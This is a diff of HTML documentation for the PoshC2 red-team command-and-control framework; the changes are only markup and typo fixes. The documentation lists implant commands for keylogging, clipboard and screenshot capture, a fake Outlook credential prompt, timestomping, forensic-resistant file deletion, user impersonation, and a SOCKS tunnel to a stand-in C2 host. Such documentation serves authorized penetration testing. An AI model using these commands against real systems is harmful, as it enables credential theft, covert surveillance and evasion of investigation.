 <p>Returns the process ID of the implant from the database. This command does not go to the implant to retrieve this information:</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">Pid</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">Pid</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="get-system">
 <h2>Get-System<a class="headerlink" href="#get-system" title="Permalink to this headline">¶</a></h2>
 <p>This is not an privilege escalation technique, this merely provides a SYSTEM level implant if you already have elevated rights but actually require a SYSTEM implant not user level.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">System</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">System</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="get-system-withproxy">
 <h2>Get-System-WithProxy<a class="headerlink" href="#get-system-withproxy" title="Permalink to this headline">¶</a></h2>
 <p>This is not an privilege escalation technique, this merely provides a SYSTEM level implant if you already have elevated rights but actually require a SYSTEM implant not user level. This takes the “proxypayload” that will have been generated using CreateProxyPayload rather than a direct connection.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">System</span><span class="o">-</span><span class="n">WithProxy</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">System</span><span class="o">-</span><span class="n">WithProxy</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="get-system-withdaisy">
 <h2>Get-System-WithDaisy<a class="headerlink" href="#get-system-withdaisy" title="Permalink to this headline">¶</a></h2>
 <p>This is not an privilege escalation technique, this merely provides a SYSTEM level implant if you already have elevated rights but actually require a SYSTEM implant not user level. This takes the “daisypayload” that will have been generated using Invoke-DaisyChain rather than a direct connection.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">System</span><span class="o">-</span><span class="n">WithDaisy</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">System</span><span class="o">-</span><span class="n">WithDaisy</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="get-implantworkingdirectory">
 <h2>Get-ImplantWorkingDirectory<a class="headerlink" href="#get-implantworkingdirectory" title="Permalink to this headline">¶</a></h2>
 <p>Returns the implant working directory from the database. This command does not go to the implant to retrieve this information:</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">ImplantWorkingDirectory</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">ImplantWorkingDirectory</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="posh-delete">
 <h2>Posh-Delete<a class="headerlink" href="#posh-delete" title="Permalink to this headline">¶</a></h2>
 <p>This function creates a block of bytes in memory full of random content and overwrites the file with this before removing from disk. This option will help prevent forensic investigations against files that have been dropped to disk during the engagement, therefore is more OpSec aware. Please be aware this may take time on larger files.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Posh</span><span class="o">-</span><span class="n">Delete</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Temp</span>\<span class="n">svc</span><span class="o">.</span><span class="n">exe</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Posh</span><span class="o">-</span><span class="n">Delete</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Temp</span>\<span class="n">svc</span><span class="o">.</span><span class="n">exe</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="get-webpage">
 <h2>Get-Webpage<a class="headerlink" href="#get-webpage" title="Permalink to this headline">¶</a></h2>
 <p>This returns a webpage in the form of HTML and appears in your downloaded content. This basically allows you to scrape basic HTML pages and render them client side without the need of invoking a SocksProxy or equivalent.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">Webpage</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">intranet</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">Webpage</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">intranet</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="enablerdp">
 <h2>EnableRDP<a class="headerlink" href="#enablerdp" title="Permalink to this headline">¶</a></h2>
 <p>This function enables RDP via the registry and enables the firewall rule associated. This must be run with elevated privileges otherwise it will fail as its changing registry values in HKLM.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">EnableRDP</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">EnableRDP</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="disablerdp">
 <h2>DisableRDP<a class="headerlink" href="#disablerdp" title="Permalink to this headline">¶</a></h2>
 <p>This function disables RDP via the registry and removes or disables the firewall rule associated if one was created. This must be run with elevated privileges otherwise it will fail as its changing registry values in HKLM.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">DisableRDP</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">DisableRDP</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="timestomp">
 <h2>TimeStomp<a class="headerlink" href="#timestomp" title="Permalink to this headline">¶</a></h2>
-<p>Timestomping has been around for many years and is an effective way of evading detection when an investigation has been started against the target. If an analyst is looking into newly created files or checking files in startup locations that have been written to for many years, this is a great deterrent.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">TimeStomp</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">System32</span>\<span class="n">Service</span><span class="o">.</span><span class="n">exe</span> <span class="s2">&quot;01/03/2008 12:12 pm&quot;</span>
+<p>Time stomping has been around for many years and is an effective way of evading detection when an investigation has been started against the target. If an analyst is looking into newly created files or checking files in startup locations that have been written to for many years, this is a great deterrent.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">TimeStomp</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">System32</span>\<span class="n">Service</span><span class="o">.</span><span class="n">exe</span> <span class="s2">&quot;01/03/2008 12:12 pm&quot;</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="get-screenshot">
 <h2>Get-Screenshot<a class="headerlink" href="#get-screenshot" title="Permalink to this headline">¶</a></h2>
 <p>Returns a screenshot of the users desktop, this <strong>should</strong> retrieve all valid desktops and monitors that are accessible to the users screen.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">Screenshot</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">Screenshot</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="get-screenshotmulti">
 <h2>Get-ScreenshotMulti<a class="headerlink" href="#get-screenshotmulti" title="Permalink to this headline">¶</a></h2>
 <p>This function will run the Get-Screenshot command over a period of time provided and obtain multiple screenshots. This will enable the PoshC2 user to watch or monitor the users activity.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">ScreenshotMulti</span> <span class="o">-</span><span class="n">Timedelay</span> <span class="mi">120</span> <span class="o">-</span><span class="n">Quantity</span> <span class="mi">30</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">ScreenshotMulti</span> <span class="o">-</span><span class="n">Timedelay</span> <span class="mi">120</span> <span class="o">-</span><span class="n">Quantity</span> <span class="mi">30</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="get-screenshotallwindows">
 <h2>Get-ScreenshotAllWindows<a class="headerlink" href="#get-screenshotallwindows" title="Permalink to this headline">¶</a></h2>
 <p>This function will loop through the active desktop windows and try to capture a screenshot, this will work if the window is be overlayed by another screen. This will not work if the window has been minimised.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">ScreenshotAllWindows</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">ScreenshotAllWindows</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="cred-popper">
 <h2>Cred-Popper<a class="headerlink" href="#cred-popper" title="Permalink to this headline">¶</a></h2>
 <p>This uses the Powershell to launch a Windows login prompt that pre-populates the users username and domain and asks that “Outlook” requires their credentials. This can be edited but it does not allow this on the command line. This then returns the entered credentials via the C2 channel.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Cred</span><span class="o">-</span><span class="n">Popper</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Cred</span><span class="o">-</span><span class="n">Popper</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="get-clipboard">
 <h2>Get-Clipboard<a class="headerlink" href="#get-clipboard" title="Permalink to this headline">¶</a></h2>
 <p>This uses “windows.forms.clipboard” to retrieve whatever value is in the clipboard, this could be used to capture passwords that have been copied and pasted.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">Clipboard</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">Clipboard</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="get-allfirewallrules">
 <h2>Get-AllFirewallRules<a class="headerlink" href="#get-allfirewallrules" title="Permalink to this headline">¶</a></h2>
 <p>Using the COM object “HNetCfg.FwPolicy2” this retrieves the rules and dumps the information to CSV is supplied as a parameter. If no parameter is supplied it will show the results on screen.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">AllFirewallRules</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span>\<span class="n">rules</span><span class="o">.</span><span class="n">csv</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">AllFirewallRules</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span>\<span class="n">rules</span><span class="o">.</span><span class="n">csv</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="get-allservices">
 <h2>Get-AllServices<a class="headerlink" href="#get-allservices" title="Permalink to this headline">¶</a></h2>
-<p>Using native Powershell this iteritively searches through “HKLM:SystemCurrentControlSetservices” to pull out the ImagePath and Description fields for all Windows services.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">AllServices</span>
+<p>Using native Powershell this iteratively searches through “HKLM:SystemCurrentControlSetservices” to pull out the ImagePath and Description fields for all Windows services.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">AllServices</span>
 </pre></div>
 </div>
 </div>
@@ -559,34 +559,34 @@
 <p>SOCKS support is built into most modern browsers and cURL. However, to use tools like rdesktop or nmap, proxychains on Linux can be used to tunnel the traffic. In order to simulate ProxyChains when using Windows, software such as ProxyCap (<a class="reference external" href="http://www.proxycap.com/">http://www.proxycap.com/</a>) can be used.</p>
 <p>Previously, if a SOCKS was required then another implant, such as Meterpreter, would have to be deployed in order to provide the ability to tunnel TCP traffic into the internal network. We arrived at the decision that deploying a full implant just for SOCKS support is overkill and while e.g. Meterpreter is very good, it is also can be noisy and is not an appropriate representation of most sophisticated threat actors TTPs. Since PoshC2 is our publicly available C2, we wanted to add this ability for the wider world too, just like we have in our internal tooling.</p>
 <p>To deploy SharpSocks use the following command within PoshC2. This also has its own stand-alone module but has been integrated into PoshC2 to work seamlessly. Ensure you have fully configured your C2 proxy to forward traffic back to this host.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">SharpSocks</span> <span class="o">-</span><span class="n">Uri</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">c2</span><span class="o">.</span><span class="n">com</span><span class="p">:</span><span class="mi">9090</span> <span class="o">-</span><span class="n">Beacon</span> <span class="mi">2000</span> <span class="o">-</span><span class="n">Insecure</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">SharpSocks</span> <span class="o">-</span><span class="n">Uri</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">c2</span><span class="o">.</span><span class="n">com</span><span class="p">:</span><span class="mi">9090</span> <span class="o">-</span><span class="n">Beacon</span> <span class="mi">2000</span> <span class="o">-</span><span class="n">Insecure</span>
 </pre></div>
 </div>
 <iframe width="480" height="270" src="https://www.youtube.com/embed/-p_hAgmM90k?feature=oembed" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe></div>
 <div class="section" id="get-keystrokes">
 <h2>Get-Keystrokes<a class="headerlink" href="#get-keystrokes" title="Permalink to this headline">¶</a></h2>
 <p>Although this is an external module initially created in PowerShellMafia, we have changed the function to be in memory and not touch disk. <a class="reference external" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1">Get-Keystrokes.ps1</a></p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">Keystrokes</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">Keystrokes</span>
 </pre></div>
 </div>
 <p>By default the keylogger will run for 60 minutes and to obtain the keylog output you must run:</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">KeystrokesData</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">KeystrokesData</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="invoke-runas">
 <h2>Invoke-Runas<a class="headerlink" href="#invoke-runas" title="Permalink to this headline">¶</a></h2>
 <p>The <cite>Invoke-Runas</cite> function was modified from the original work by <a class="reference external" href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps1">FuzzySecurity</a> to work with PoshC2 and to create a primary token whether you run this from a user level perspective or SYSTEM.</p>
-<p>This module has also been modified to not touch disk when executing. The options are shown below but payload types are disccused in more detail under lateral movement. This feature will allow you to impersonate another user and obtain a secondary implant as that user.</p>
+<p>This module has also been modified to not touch disk when executing. The options are shown below but payload types are discussed in more detail under lateral movement. This feature will allow you to impersonate another user and obtain a secondary implant as that user.</p>
 <p>If running as Standard user - Args MAX Length is 1024 characters, leverages the following API call:</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">using</span> <span class="n">Advapi32</span><span class="p">::</span><span class="n">CreateProcessWithLogonW</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">using</span> <span class="n">Advapi32</span><span class="p">::</span><span class="n">CreateProcessWithLogonW</span>
 </pre></div>
 </div>
 <p>If running as SYSTEM user - Args MAX Length is 32k characters, leverages the following API call:</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Advapi32</span><span class="p">::</span><span class="n">LogonUser</span><span class="p">,</span> <span class="n">Advapi32</span><span class="p">::</span><span class="n">DuplicateTokenEx</span><span class="p">,</span> <span class="n">CreateProcessAsUser</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Advapi32</span><span class="p">::</span><span class="n">LogonUser</span><span class="p">,</span> <span class="n">Advapi32</span><span class="p">::</span><span class="n">DuplicateTokenEx</span><span class="p">,</span> <span class="n">CreateProcessAsUser</span>
 </pre></div>
 </div>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">RunasPayload</span> <span class="o">-</span><span class="n">User</span> <span class="o">&lt;</span><span class="n">user</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Password</span> <span class="s1">&#39;&lt;pass&gt;&#39;</span> <span class="o">-</span><span class="n">Domain</span> <span class="o">&lt;</span><span class="n">dom</span><span class="o">&gt;</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">RunasPayload</span> <span class="o">-</span><span class="n">User</span> <span class="o">&lt;</span><span class="n">user</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Password</span> <span class="s1">&#39;&lt;pass&gt;&#39;</span> <span class="o">-</span><span class="n">Domain</span> <span class="o">&lt;</span><span class="n">dom</span><span class="o">&gt;</span>
 <span class="n">Invoke</span><span class="o">-</span><span class="n">RunasProxyPayload</span> <span class="o">-</span><span class="n">User</span> <span class="o">&lt;</span><span class="n">user</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Password</span> <span class="s1">&#39;&lt;pass&gt;&#39;</span> <span class="o">-</span><span class="n">Domain</span> <span class="o">&lt;</span><span class="n">dom</span><span class="o">&gt;</span>
 <span class="n">Invoke</span><span class="o">-</span><span class="n">RunasDaisyPayload</span> <span class="o">-</span><span class="n">User</span> <span class="o">&lt;</span><span class="n">user</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Password</span> <span class="s1">&#39;&lt;pass&gt;&#39;</span> <span class="o">-</span><span class="n">Domain</span> <span class="o">&lt;</span><span class="n">dom</span><span class="o">&gt;</span>
 </pre></div>
